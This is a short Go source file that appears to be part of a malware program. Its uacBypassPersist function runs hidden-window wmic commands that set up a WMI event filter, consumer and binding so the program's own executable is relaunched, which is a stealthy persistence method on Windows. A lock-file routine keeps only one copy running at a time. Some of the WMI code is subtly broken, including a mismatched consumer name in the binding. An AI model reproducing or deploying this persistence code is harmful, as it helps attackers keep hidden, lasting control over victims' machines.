package main

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"
)

var LockFilePath = "g0_l4nG_1S_FuN_i5nT_1T.lock"

func uacBypassPersist(path string) error {
	fPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	commands := []string{
		"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
		fmt.Sprintf("wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='GuacBypassConsumer', ExecutablePath='%s',CommandLineTemplate='%s'", fPath, fPath),
		"wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer'')",
	}

	for _, command := range commands {
		cmd := NewCmd(command)
		cmd.Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if _, err := cmd.Exec.Output(); err != nil {
			return err
		}

		// Check for 1 second before command execution.
		time.Sleep(time.Second)
	}
	return nil
}

// run-once file
func create_lock_file(filename string) (*os.File, error) {
	if _, err := os.Stat(filename); err == nil {
		err = os.Remove(filename)
		if err != nil {
			return nil, err
		}

	}
	return os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0666)
}

func checkRunOnce(filename string) (*os.File, bool) {
	filePointer, err := create_lock_file(filename)

	if err != nil {
		// fmt.Println("someone is running")
		return nil, false
	}
	return filePointer, true

	// filePointer, runOnceResult := checkRunOnce(LockFilePath)

	// if !runOnceResult {
	// 	fmt.Println("Can't run. Someone is running")
	// 	exit
	// }

	// defer os.Remove(LockFilePath) // defer executes backward
	// defer filePointer.Close()
}
